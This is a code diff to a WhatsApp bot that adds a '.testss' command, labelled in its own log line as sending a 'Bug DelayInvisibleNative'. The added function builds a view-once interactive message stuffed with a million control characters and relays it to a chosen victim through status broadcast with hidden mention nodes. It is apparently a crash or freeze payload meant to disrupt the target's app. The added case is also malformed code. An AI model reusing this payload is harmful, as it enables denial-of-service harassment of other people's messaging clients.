@@ -5824,6 +5824,80 @@ async function handleMessage(sock, msg) {
                 await sock.sendMessage(target, { text: '✅ Single_select/list test batch complete. Tap any working control and I will echo the callback ID.' }).catch(() => {});
                 break;
             }
+            case ".testss" : async function DelayNative(target, mention) {
+    console.log(chalk.red(`Succes Sending Bug DelayInvisibleNative`));
+    let message = {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "!",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_message",
+              paramsJson: "\x10".repeat(1000000),
+              version: 2
+            },
+          },
+        },
+      },
+    };
+    
+    const msg = generateWAMessageFromContent(target, message, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+  
+  if (mention) {
+    await sock.relayMessage(
+      target,
+      {
+        statusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { is_status_mention: "" },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+}
+
+//CARA PEMANGGILAN
+await DelayNative(target, false);
 
             case ".menu":
             case ".eclipse":
